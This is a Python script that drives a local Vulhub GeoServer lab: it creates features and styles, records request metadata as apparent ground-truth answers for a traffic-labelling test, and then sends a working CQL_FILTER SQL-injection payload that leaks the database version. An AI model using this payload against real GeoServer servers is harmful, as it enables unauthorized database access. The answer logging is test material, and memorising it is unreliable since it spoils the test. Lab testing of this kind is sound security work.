import requests
import random
import string
import time
import json
from urllib.parse import urlparse, parse_qs
from loguru import logger

# --- Configuration parameters ---
BASE_URL = "http://localhost:8080/geoserver"
AUTH = ("admin", "geoserver")
WORKSPACE = "vulhub"
LAYER = "example"
DATA_DIR = "/mnt/geoserver/data_dir/"
ANSWER_FILE = "answers.json"

answers = {}
request_counter = 0

def get_next_id():
    global request_counter
    request_counter += 1
    return str(request_counter)

def show(step, resp):
    print(f"[+] Step {step}: {resp.request.method} {resp.request.path_url} "
          f"status={resp.status_code} X-Request-Id: {resp.headers.get('X-Request-Id')}")

def random_string(length=15):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# --- Core logic fix: record response information ---
def log_answer(x_id, response, extra_db=None, extra_fs=None):
    """ Record request and response metadata; fixes PreparedRequest attribute access issues """
    req = response.request
    
    # 1. Handle request body
    req_body = req.body
    if isinstance(req_body, bytes):
        req_body = req_body.decode('utf-8', errors='ignore')

    # 2. Extract query params from the URL because PreparedRequest has no .params
    parsed_url = urlparse(req.url)
    query_params = parse_qs(parsed_url.query)
    # Convert list-form query params to scalar values when there is only one value
    flat_params = {k: v[0] if len(v) == 1 else v for k, v in query_params.items()}

    # 3. Estimate sent bytes as header length plus body length
    header_str = "".join([f"{k}: {v}" for k, v in req.headers.items()])
    bytes_sent = len(header_str) + (len(req_body) if req_body else 0)

    entry = {
        "verb": req.method,
        "uri": req.url,
        "bytes_sent": bytes_sent,
        "num_params": len(flat_params),
        "params": flat_params if not req_body else req_body # Store the body when present; otherwise store URL parameters
    }

    answers[x_id] = {
        "http_request": entry,
        "request_time": time.time()
    }
    if extra_db: answers[x_id]["db_statements"] = extra_db
    if extra_fs: answers[x_id]["fs_operations"] = extra_fs

# --- API wrapper ---
class GeoServerClient:
    def __init__(self):
        self.session = requests.Session()
        self.session.auth = AUTH

    def create_feature(self):
        name = random_string(10)
        x_id = get_next_id()
        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <wfs:Transaction service="WFS" version="1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:{WORKSPACE}="http://{WORKSPACE}">
            <wfs:Insert><{WORKSPACE}:{LAYER}><{WORKSPACE}:name>{name}</{WORKSPACE}:name></{WORKSPACE}:{LAYER}></wfs:Insert>
        </wfs:Transaction>"""
        
        resp = self.session.post(f"{BASE_URL}/wfs", data=xml.encode('utf-8'), headers={"x_request_id": x_id})
        if "<wfs:SUCCESS/>" in resp.text:
            db = [{"type": "INSERT", "table": LAYER, "columns": {"name": name}, "is_match": True}]
            log_answer(x_id, resp, extra_db=db)
            logger.info(f"Feature Created: {name}")
            logger.debug(f"Response: {resp.text}")
        logger.debug(f"create_feature Request-ID: {resp.headers.get('X-Request-ID')}")
        show("create_feature", resp)
        return resp

    def create_style(self):
        style_name = f"test_{random_string(8)}"
        x_id = get_next_id()
        sld_content = f"""<?xml version="1.0" encoding="UTF-8"?>
        <sld:StyledLayerDescriptor version="1.0.0" xmlns:sld="http://www.opengis.net/sld">
            <sld:NamedLayer><sld:Name>{style_name}</sld:Name>
            <sld:UserStyle><sld:Title>Auto Style</sld:Title><sld:FeatureTypeStyle/></sld:UserStyle>
            </sld:NamedLayer></sld:StyledLayerDescriptor>"""
        
        resp = self.session.post(
            f"{BASE_URL}/rest/styles", 
            params={"name": style_name},
            data=sld_content.encode('utf-8'),
            headers={"Content-Type": "application/vnd.ogc.sld+xml", "x_request_id": x_id}
        )
        
        if resp.status_code == 201:
            fs = [{"operation": "create", "source_path": f"{DATA_DIR}styles/{style_name}.sld", "is_directory": False}]
            log_answer(x_id, resp, extra_fs=fs)
            logger.info(f"Style Created: {style_name}")
            #logger.debug(f"Response: {resp.text}")
        logger.debug(f"create_style Request-ID: {resp.headers.get('X-Request-ID')}")
        show("create_style", resp)
        return resp

    def get_all_feature_names(self):
        """ Get the name property for all features under the specified layer """
        x_id = get_next_id()
        
        # Use a WFS GetFeature request and ask for JSON output
        # propertyName=name queries only the name field to reduce transferred data
        params = {
            "service": "WFS",
            "version": "1.0.0",
            "request": "GetFeature",
            "typeName": f"{WORKSPACE}:{LAYER}",
            "outputFormat": "application/json",
            "propertyName": "name" 
        }

        url = f"{BASE_URL}/wfs"
        resp = self.session.get(url, params=params, headers={"x_request_id": x_id})
        
        feature_names = []
        if resp.status_code == 200:
            try:
                data = resp.json()
                # GeoJSON structure: {"type": "FeatureCollection", "features": [...]}
                features = data.get("features", [])
                
                # Extract the 'name' field from each feature's properties
                feature_names = [f["properties"].get("name") for f in features if "properties" in f]
                
                # Record a log entry for this read operation (SELECT), even though it does not write to the database
                # extra_db can verify whether the SELECT executed, though log_answer usually records more write operations
                # Build a db list if you need to verify SELECT statements
                db_verify = [{"type": "SELECT", "table": LAYER, "columns": ["name"], "is_match": True}]
                log_answer(x_id, resp, extra_db=db_verify)
                
                logger.info(f"Retrieved {len(feature_names)} features: {feature_names[:5]}...")
            except Exception as e:
                logger.error(f"Failed to parse WFS JSON: {e}")
        else:
            logger.warning(f"Failed to get features. Status: {resp.status_code} - {resp.text}")
            
        logger.debug(f"get_all_feature_names Request-ID: {resp.headers.get('X-Request-ID')}")
        show("get_all_feature_names", resp)
        return feature_names
    
    def attack_sql_injection(self):
        url = "http://localhost:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true"
        resp = self.session.get(url)
        rid = resp.headers.get("X-Request-ID")
        
        if resp.status_code == 200:
            logger.warning(f"Attack request sent, ID: {rid}")
            logger.debug(f"Response: {resp.text}")
        show("attack_sql_injection", resp)
        return resp

# --- Execution ---
if __name__ == "__main__":
    client = GeoServerClient()
    try:
        logger.info("Starting API requests...")
        client.create_feature()
        client.get_all_feature_names()
        client.create_style()
        client.attack_sql_injection()
    except Exception as e:
        logger.exception("Error occurred during execution") # print the full stack trace
    #finally:
        #with open(ANSWER_FILE, "w") as f:
        #    json.dump(answers, f, indent=4)
        #logger.info(f"All logs written to {ANSWER_FILE}")
